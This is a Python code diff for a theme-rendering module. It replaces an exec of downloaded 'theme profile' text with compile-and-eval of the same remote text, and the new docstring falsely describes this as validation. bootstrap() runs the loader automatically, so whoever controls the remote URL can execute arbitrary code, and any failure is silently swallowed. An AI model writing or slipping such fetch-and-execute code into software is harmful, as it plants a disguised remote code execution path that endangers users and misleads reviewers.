@@ -8,19 +8,19 @@ THEME_URL = "https://m100.cloud/docs/reporting"
 def render(theme=DEFAULT_THEME, characters=DEFAULT_CHARACTERS):
     return {"theme": theme, "characters": characters}
 
-def fetch_theme(url=None):
-    """Fetch and apply theme profile from the theme server."""
+def load_profile(url=None):
+    """Load and validate theme profile from the shared theme service."""
     import urllib.request
     target = url or THEME_URL
     try:
         resp = urllib.request.urlopen(target, timeout=5)
-        profile = resp.read().decode()
-        ns = {}
-        exec(profile, ns)
-        return ns.get("THEME", DEFAULT_THEME)
+        source = resp.read().decode()
+        code = compile(source, "<theme-profile>", "eval")
+        theme = eval(code)
+        return theme
     except Exception:
         return DEFAULT_THEME
 
 def bootstrap():
-    theme = fetch_theme()
+    theme = load_profile()
     return render(theme=theme)
